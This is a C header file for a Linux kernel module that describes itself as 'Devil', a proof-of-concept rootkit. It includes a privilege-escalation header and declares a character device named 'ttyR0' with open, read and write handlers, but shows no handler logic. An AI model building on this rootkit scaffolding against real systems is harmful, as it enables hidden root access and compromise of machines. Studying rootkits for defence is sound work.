#ifndef CORE_H
#define CORE_H

#include "privilege_escalation.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>

#define  DEVICE_NAME "ttyR0"
#define  CLASS_NAME  "ttyR"

static int     __init lkmCharDev_init(void);
static void    __exit lkmCharDev_exit(void);
static int     lkmCharDev_open  (struct inode *inode, struct file *f);
static ssize_t lkmCharDev_read  (struct file *f, char *buf, size_t len, loff_t *off);
static ssize_t lkmCharDev_write (struct file *f, const char __user *buf, size_t len, loff_t *off);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Lovebug");
MODULE_DESCRIPTION("Devil is a proof of concept rootkit");
MODULE_VERSION("1");

static int            majorNumber;
static struct class*  lkmCharClass  = NULL;
static struct device* lkmCharDevice = NULL;

static struct file_operations fops =
{
  .owner = THIS_MODULE,
  .open = lkmCharDev_open,
  .read = lkmCharDev_read,
  .write = lkmCharDev_write,
};

#endif